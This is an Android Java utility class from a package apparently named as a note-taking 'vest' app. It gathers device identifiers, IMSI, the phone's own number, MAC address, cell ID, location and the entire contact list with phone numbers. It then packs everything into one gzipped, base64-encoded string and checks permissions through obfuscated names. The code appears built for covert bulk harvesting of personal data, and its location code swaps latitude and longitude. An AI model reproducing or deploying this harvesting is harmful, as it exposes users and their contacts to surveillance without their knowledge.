package cn.com.caoyue.tinynote.vest.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Configuration;
import android.database.Cursor;
import android.location.GpsStatus;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.ConditionVariable;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthLte;
import android.telephony.CellSignalStrengthWcdma;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.UUID;

public class DeviceInfoUtils {

    public static JSONObject getBasic(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("and_id", isNullText(getAndroidID(context)));
            json.put("gaid", isNullText(getGaid(context)));
            json.put("sn", isNullText(getDriverSerial()));
            json.put("model", isNullText(getDriverModel()));
            json.put("brand", isNullText(getDriverBrand()));
            json.put("release", isNullText(getDriverReleaseVersion()));
            json.put("sdk_version", isNullText(getDriverSdkVersion()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    public static String getDeviceInfo(Context context, List<String> items, boolean gzip) {
        Map<String, Object> map = new HashMap<>();
        for (String item : items) {
            if (TextUtils.equals(item, "hardware")) {
                map.put(item, getHardware(context));
            } else if (TextUtils.equals(item, "general_data")) {
                map.put(item, getGeneral(context));
            } else if (TextUtils.equals(item, "contact")) {
                map.put(item, getContacts(context));
            } else if (TextUtils.equals(item, "location")) {
                map.put(item, getLocation(context));
            } else if (TextUtils.equals(item, "battery_status")) {
                map.put(item, getBatteryStatus(context));
            }
        }
        String devices = CommonUtils.getMapToString(map);
        return gzip ? CommonUtils.base64(CommonUtils.gzip(devices)) : devices;
    }

    public static String getAndroidID(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    // ----------------------- Private ---------------------------
    private static JSONObject getHardware(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("model", isNullText(getDriverModel()));
            json.put("brand", isNullText(getDriverBrand()));
            json.put("device_name", isNullText(getDriverBrand()));
            json.put("product", isNullText(getDriverProduct()));
            json.put("release", isNullText(getDriverReleaseVersion()));
            json.put("sdk_version", isNullText(getDriverSdkVersion()));
            json.put("physical_size", isNullText(getPhysicalSize(context)));
            json.put("serial_number", isNullText(getDriverSerial()));
            json.put("cpu_type", isNullText(getCpuName()));
            // 新增
            json.put("modelName", isNullText(getDriverModel()));
            json.put("handSetMakers", isNullText(getDriverProduct()));
            json.put("manufacturerName", isNullText(getDriverBrand()));
            json.put("board", isNullText(getDriverBoard()));
            json.put("serial", isNullText(getDriverSerial()));
            json.put("display", isNullText(getDriverDisplay()));
            json.put("id", isNullText(getDriverId()));
            json.put("bootloader", isNullText(getDriverBootloader()));
            json.put("fingerPrint", isNullText(getDriverFingerprint()));
            json.put("host", isNullText(getDriverHost()));
            json.put("hardWare", isNullText(getDriverHardWare()));
            json.put("device", isNullText(getDriverDevice()));
            json.put("user", isNullText(getDriverUser()));
            json.put("radioVersion", isNullText(getRadioVersion()));
            json.put("tags", isNullText(getDriverTags()));
            json.put("time", isNullText(getDriverTime()));
            json.put("type", isNullText(getDriverType()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONObject getGeneral(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("deviceid", isNullText(getDeviceId(context)));
            json.put("and_id", isNullText(getAndroidID(context)));
            json.put("gaid", isNullText(getGaid(context)));
            json.put("network_operator_name", isNullText(getNetworkOperatorName(context)));
            json.put("network_operator", isNullText(getNetworkOperator(context)));
            json.put("network_type", isNullText(getNetWorkModel(context)));
            json.put("phone_type", isNullText(getPhoneType(context)));
            json.put("phone_number", isNullText(getLine1Number(context)));
            json.put("mcc", isNullText(getMCC(context)));
            json.put("mnc", isNullText(getMNC(context)));
            json.put("locale_iso_3_language", isNullText(getISO3Language(context)));
            json.put("locale_iso_3_country", isNullText(getISO3Country(context)));
            json.put("time_zone_id", isNullText(getTimeZoneId()));
            json.put("locale_display_language", isNullText(getLocaleDisplayLanguage()));
            // 需要卡
            json.put("imsi", isNullText(getImsi(context)));
            Map<String, Object> info = getCellInfo(context);
            if (info.containsKey("cid")) {
                json.put("cid", isNullText(String.valueOf(info.get("cid"))));
            }
            json.put("dns", isNullText(getLocalDNS()));
            json.put("uuid", isNullText(getDriverUUID(context)));
            json.put("mac", isNullText(getMacAddress(context)));
            json.put("language", isNullText(getOsLanguage(context)));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONArray getContacts(Context context) {
        JSONArray jsonArray = new JSONArray();
        if (!CommonUtils.checkPermission(context, CommonUtils.decodeStr(Constants.READ_CONTACTS)))
            return jsonArray;

        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        try {
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String emailAddress = "";
                String group_id = "";
                jsonObject.put("_id", contactId);
                String custom_ringtone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CUSTOM_RINGTONE));
                String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                String send_to_voicemail = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.SEND_TO_VOICEMAIL));
                String starred = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.STARRED));
                String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                String has_phone_number = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                String in_visible_group = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IN_VISIBLE_GROUP));
                String is_user_profile = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IS_USER_PROFILE));
                String photo_id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_ID));
                String contact_status = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS));
                String contact_status_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS_TIMESTAMP));
                String display_name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                StringBuffer sb = new StringBuffer();
                Cursor phone_number = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
                List<String> phoneList = new ArrayList<>();
                // 一个人可能有几个号码
                while (null != phone_number && phone_number.moveToNext()) {
                    String strPhoneNumber = phone_number.getString(phone_number.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phoneList.add(strPhoneNumber);
                }

                if (phoneList.size() > 0) {
                    phoneList = CommonUtils.removeDuplicate(phoneList);
                    for (int i = 0; i < phoneList.size(); i++) {
                        sb.append(phoneList.get(i)).append(",");
                    }
                }
                String phones = sb.toString();
                if (phones.indexOf(",") != -1) {
                    phones = sb.deleteCharAt(sb.length() - 1).toString();
                }
                CommonUtils.closeSilently(phone_number);

                jsonObject.put("number", isNullText(phones));
                jsonObject.put("up_time", isNullText(updated_timestamp));
                jsonObject.put("custom_ringtone", isNullText(custom_ringtone));
                jsonObject.put("last_time_contacted", isNullText(last_time_contacted));
                jsonObject.put("send_to_voicemail", isNullText(send_to_voicemail));
                jsonObject.put("starred", starred);
                jsonObject.put("times_contacted", times_contacted);
                jsonObject.put("has_phone_number", has_phone_number);
                jsonObject.put("in_visible_group", in_visible_group);
                jsonObject.put("is_user_profile", is_user_profile);
                jsonObject.put("photo_id", photo_id);
                jsonObject.put("contact_status", contact_status);
                jsonObject.put("contact_status_ts", contact_status_timestamp);
                jsonObject.put("contact_display_name", display_name);
                jsonArray.put(jsonObject);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            CommonUtils.closeSilently(cursor);
        }

        return jsonArray;
    }

    private static JSONObject getLocation(Context context) {
        final JSONObject jsonObject = new JSONObject();
        if (!CommonUtils.checkPermission(context, CommonUtils.decodeStr(Constants.ACCESS_COARSE_LOCATION)))
            return jsonObject;

        final ConditionVariable conditionVariable = new ConditionVariable();
        LocationHelper helper = new LocationHelper(context);
        helper.initLocation(new LocationHelper.MyLocationListener() {
            @Override
            public void updateLastLocation(Location location) {
                try {
                    JSONObject netObj = new JSONObject();
                    netObj.put("latitude", location.getLongitude());
                    netObj.put("longitude", location.getLatitude());
                    jsonObject.put("network", netObj);
                    conditionVariable.open();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void updateLocation(Location location) {
                try {
                    JSONObject netObj = new JSONObject();
                    netObj.put("latitude", location.getLongitude());
                    netObj.put("longitude", location.getLatitude());
                    jsonObject.put("network", netObj);
                    conditionVariable.open();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void updateStatus(String provider, int status, Bundle extras) {
            }

            @Override
            public void updateGpsStatus(GpsStatus gpsStatus) {
            }
        });
        conditionVariable.block(5000);
        conditionVariable.close();
        helper.removeLocationUpdatesListener();
        return jsonObject;
    }

    private static JSONObject getBatteryStatus(Context context) {
        Intent batteryInfoIntent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int status = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        int health = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
        boolean present = batteryInfoIntent.getBooleanExtra(BatteryManager.EXTRA_PRESENT, false);
        int scale = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        int plugged = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        int voltage = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
        int temperature = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
        String technology = batteryInfoIntent.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
        String icon_small = batteryInfoIntent.getStringExtra(BatteryManager.EXTRA_ICON_SMALL);
        float batteryPct = level / (float) scale;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("battery_pct", batteryPct);
            jsonObject.put("health", health);
            jsonObject.put("temperature", temperature);
            jsonObject.put("present", present);
            jsonObject.put("icon_small", icon_small);
            jsonObject.put("status", status);
            jsonObject.put("technology", technology);
            jsonObject.put("plugged", plugged);
            jsonObject.put("scale", scale);
            jsonObject.put("level", level);
            jsonObject.put("voltage", voltage);
            switch (plugged) {
                case BatteryManager.BATTERY_PLUGGED_AC: {
                    jsonObject.put("is_usb_charge", 0);
                    jsonObject.put("is_ac_charge", 1);
                    jsonObject.put("is_charging", 1);
                    break;
                }
                case BatteryManager.BATTERY_PLUGGED_USB: {
                    jsonObject.put("is_usb_charge", 1);
                    jsonObject.put("is_ac_charge", 0);
                    jsonObject.put("is_charging", 1);
                    break;
                }
                default: {
                    jsonObject.put("is_usb_charge", 0);
                    jsonObject.put("is_ac_charge", 0);
                    jsonObject.put("is_charging", 0);
                    break;
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    // ----------------------- Separate ---------------------------
    @SuppressLint("MissingPermission")
    private static String getDriverUUID(Context context) {
        if (!CommonUtils.isPhoneStateGranted(context))
            return "";

        final TelephonyManager tm = getTelephonyManager(context);
        final String tmDevice, tmSerial, tmPhone, androidId;
        tmDevice = "" + tm.getDeviceId();
        tmSerial = "" + tm.getSimSerialNumber();
        androidId = "" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        UUID deviceUuid = new UUID(androidId.hashCode(), ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode());
        return deviceUuid.toString(); // uniqueId
    }

    @SuppressLint("MissingPermission")
    private static String getImsi(Context context) {
        if (!CommonUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getSubscriberId();
    }

    @SuppressLint("MissingPermission")
    private static String getLine1Number(Context context) {
        if (!CommonUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getLine1Number();
    }

    @SuppressLint("MissingPermission")
    private static String getDeviceId(Context context) {
        if (!CommonUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getDeviceId();
    }

    @SuppressLint("MissingPermission")
    private static Map<String, Object> getCellInfo(Context context) {
        Map<String, Object> map = new HashMap<>();
        if (!CommonUtils.isCoarseLocationGranted(context))
            return map;

        int dbm = -1;
        int cid = -1;
        List<CellInfo> cellInfoList;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            cellInfoList = getTelephonyManager(context).getAllCellInfo();
            if (null != cellInfoList) {
                for (CellInfo cellInfo : cellInfoList) {
                    if (cellInfo instanceof CellInfoGsm) {
                        CellSignalStrengthGsm cellSignalStrengthGsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthGsm.getDbm();
                        cid = ((CellInfoGsm) cellInfo).getCellIdentity().getCid();
                    } else if (cellInfo instanceof CellInfoCdma) {
                        CellSignalStrengthCdma cellSignalStrengthCdma = ((CellInfoCdma) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthCdma.getDbm();
                        cid = ((CellInfoCdma) cellInfo).getCellIdentity().getBasestationId();
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && cellInfo instanceof CellInfoWcdma) {
                        CellSignalStrengthWcdma cellSignalStrengthWcdma = ((CellInfoWcdma) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthWcdma.getDbm();
                        cid = ((CellInfoWcdma) cellInfo).getCellIdentity().getCid();
                    } else if (cellInfo instanceof CellInfoLte) {
                        CellSignalStrengthLte cellSignalStrengthLte = ((CellInfoLte) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthLte.getDbm();
                        cid = ((CellInfoLte) cellInfo).getCellIdentity().getCi();
                    }
                }
            }
        }
        map.put("dbm", dbm);
        map.put("cid", cid);
        return map;
    }

    private static String getLocalDNS() {
        Process cmdProcess = null;
        BufferedReader reader = null;
        try {
            cmdProcess = Runtime.getRuntime().exec("getprop net.dns1");
            reader = new BufferedReader(new InputStreamReader(cmdProcess.getInputStream()));
            return reader.readLine();
        } catch (IOException e) {
            return null;
        } finally {
            try {
                reader.close();
            } catch (IOException e) {
            }
            cmdProcess.destroy();
        }
    }

    private static String getOsLanguage(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getLanguage();
    }

    private static String getLocaleDisplayLanguage() {
        return Locale.getDefault().getDisplayLanguage();
    }

    private static String getTimeZoneId() {
        return TimeZone.getDefault().getID();
    }

    private static String getISO3Country(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getISO3Country();
    }

    private static String getISO3Language(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getISO3Language();
    }

    private static String getMCC(Context context) {
        Configuration cfg = context.getResources().getConfiguration();
        return String.valueOf(cfg.mcc);
    }

    private static String getMNC(Context context) {
        Configuration cfg = context.getResources().getConfiguration();
        return String.valueOf(cfg.mnc);
    }

    private static String getPhoneType(Context context) {
        String phoneTypeStr = "";
        int phoneType = getTelephonyManager(context).getPhoneType();
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_CDMA:
                phoneTypeStr = "CDMA";
                break;
            case TelephonyManager.PHONE_TYPE_GSM:
                phoneTypeStr = "GSM";
                break;
            case TelephonyManager.PHONE_TYPE_SIP:
                phoneTypeStr = "SIP";
                break;
            case TelephonyManager.PHONE_TYPE_NONE:
                phoneTypeStr = "None";
                break;
        }
        return phoneTypeStr;
    }

    private static String getNetWorkModel(Context context) {
        if (isWifiAvailable(context)) {
            return "NETWORK_WIFI";
        } else if (isNetwork4G(context)) {
            return "NETWORK_4G";
        } else if (isNetwork3G(context)) {
            return "NETWORK_3G";
        } else if (isNetwork2G(context)) {
            return "NETWORK_2G";
        } else {
            return "NETWORK_UNKNOWN";
        }
    }

    private static boolean isWifiAvailable(Context ctx) {
        ConnectivityManager conMan = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (conMan == null) {
            return false;
        }
        NetworkInfo wifiInfo = conMan.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        return (wifiInfo != null && wifiInfo.getState() == NetworkInfo.State.CONNECTED);
    }

    private static boolean isNetwork2G(Context context) {
        int subType = getMobileNetworkType(context);
        return (subType == TelephonyManager.NETWORK_TYPE_CDMA
                || subType == TelephonyManager.NETWORK_TYPE_EDGE
                || subType == TelephonyManager.NETWORK_TYPE_GPRS
                || subType == TelephonyManager.NETWORK_TYPE_1xRTT || subType == TelephonyManager.NETWORK_TYPE_IDEN);
    }

    private static boolean isNetwork3G(Context context) {
        int subType = getMobileNetworkType(context);
        boolean ret = (subType == TelephonyManager.NETWORK_TYPE_UMTS
                || subType == TelephonyManager.NETWORK_TYPE_HSDPA
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_0
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_A
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_B
                || subType == TelephonyManager.NETWORK_TYPE_HSPA
                || subType == TelephonyManager.NETWORK_TYPE_EHRPD || subType == TelephonyManager.NETWORK_TYPE_HSUPA); // TODO:
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR2) {
            ret = ret || subType == TelephonyManager.NETWORK_TYPE_HSPAP;
        }
        return ret; // 移动3G如何判断?
    }

    private static boolean isNetwork4G(Context context) {
        return getMobileNetworkType(context) == TelephonyManager.NETWORK_TYPE_LTE;
    }

    private static int getMobileNetworkType(Context context) {
        ConnectivityManager connectMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = connectMgr.getActiveNetworkInfo();
        if (info != null && info.getType() == ConnectivityManager.TYPE_MOBILE) {
            return info.getSubtype();
        }
        return -1;
    }

    private static String getNetworkOperatorName(Context context) {
        return getTelephonyManager(context).getNetworkOperatorName();
    }

    private static String getSimCountryIso(Context context) {
        return getTelephonyManager(context).getSimCountryIso();
    }

    private static String getNetworkOperator(Context context) {
        return getTelephonyManager(context).getNetworkOperator();
    }

    private static String getGaid(Context context) {
        String gaid = "";
        try {
            AdvertisingIdClient.AdInfo adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
            gaid = adInfo.getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return gaid;
    }

    private static String getMacAddress(Context context) {
        String mac = "";
        try {
            WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            mac = wifi.getConnectionInfo().getMacAddress();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return mac;
    }

    private static TelephonyManager getTelephonyManager(Context context) {
        return (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    }

    private static String isNullText(String text) {
        if (TextUtils.isEmpty(text))
            return "";
        return text;
    }

    private static String getPhysicalSize(Context context) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display defaultDisplay = windowManager.getDefaultDisplay();
        DisplayMetrics displayMetrics = new DisplayMetrics();
        defaultDisplay.getMetrics(displayMetrics);
        return Double.toString(Math.sqrt(Math.pow((double) (((float) displayMetrics.heightPixels) / displayMetrics.ydpi), 2.0d) + Math.pow((double) (((float) displayMetrics.widthPixels) / displayMetrics.xdpi), 2.0d)));
    }

    private static String getCpuName() {
        try {
            FileReader fr = new FileReader("/proc/cpuinfo");
            BufferedReader br = new BufferedReader(fr);
            String text = br.readLine();
            String[] array = text.split(":\\s+", 2);
            for (int i = 0; i < array.length; i++) {
            }
            return array[1];
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    private static String getDriverSerial() {
        return Build.SERIAL;
    }

    private static String getDriverBrand() {
        return Build.BRAND;
    }

    private static String getDriverModel() {
        return Build.MODEL;
    }

    private static String getDriverReleaseVersion() {
        return Build.VERSION.RELEASE;
    }

    private static String getDriverSdkVersion() {
        return Build.VERSION.SDK;
    }

    private static String getDriverProduct() {
        return Build.PRODUCT;
    }

    private static String getDriverBoard() {
        return Build.BOARD;
    }

    private static String getDriverDisplay() {
        return Build.DISPLAY;
    }

    private static String getDriverId() {
        return Build.ID;
    }

    private static String getDriverBootloader() {
        return Build.BOOTLOADER;
    }

    private static String getDriverFingerprint() {
        return Build.FINGERPRINT;
    }

    private static String getDriverHost() {
        return Build.HOST;
    }

    private static String getDriverHardWare() {
        return Build.HARDWARE;
    }

    private static String getDriverDevice() {
        return Build.DEVICE;
    }

    private static String getDriverUser() {
        return Build.USER;
    }

    private static String getRadioVersion() {
        return Build.getRadioVersion();
    }

    private static String getDriverTags() {
        return Build.TAGS;
    }

    private static String getDriverTime() {
        return String.valueOf(Build.TIME);
    }

    private static String getDriverType() {
        return Build.TYPE;
    }
}
